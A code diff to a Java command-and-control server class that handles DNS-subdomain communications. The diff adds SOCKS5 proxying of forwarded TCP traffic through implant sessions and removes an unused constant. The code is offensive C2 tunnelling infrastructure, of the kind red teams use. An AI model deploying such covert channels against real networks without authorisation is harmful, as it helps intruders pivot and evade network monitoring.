@@ -39,7 +39,6 @@ public class DNSEmulatorSubdomainComms extends C2Interface {
 
 	private String screenshotBuffer = "";
 
-	private final byte BIT_ONE = 1;
 	private final int UNKNOWN_SESSION = 0;
 	//TODO: Eliminte this, and cache the PID from the original transmission in the Session.
 	private final int PLACEHOLDER_PID = 9999;
@@ -255,6 +254,29 @@ public class DNSEmulatorSubdomainComms extends C2Interface {
 									}
 									// System.out.println("Request Data: " + pfRequest[0] + " at " + sessionId);
 									String nextData = io.grabForwardedTCPTraffic(sessionId, pfRequest[0]);
+									if (nextData != null) {
+										response = nextData;
+									} else {
+										response = Constants.PORT_FORWARD_NO_DATA;
+									}
+								} catch (IllegalArgumentException ex) {
+									response = "Invalid request";
+								}
+							}
+						} else if (message.startsWith("<socks5>")) {
+							//TODO: Consolidate code with above portForward functionality
+							String[] pfRequest = message.substring("<socks5>".length()).split("<pf>");
+							if (pfRequest.length != 2) {
+								response = "Invalid request";
+							} else {
+								try {
+									int socksId = Integer.parseInt(pfRequest[0]);
+									String forwardID = "socksproxy:" + socksId;
+									if (!pfRequest[1].equals("<REQUEST_DATA>")) {
+										io.queueForwardedTCPTraffic(sessionId, forwardID, pfRequest[1]);
+									}
+									// System.out.println("Request Data: " + pfRequest[0] + " at " + sessionId);
+									String nextData = io.grabForwardedTCPTraffic(sessionId, forwardID);
 									if (nextData != null) {
 										response = nextData;
 									} else {
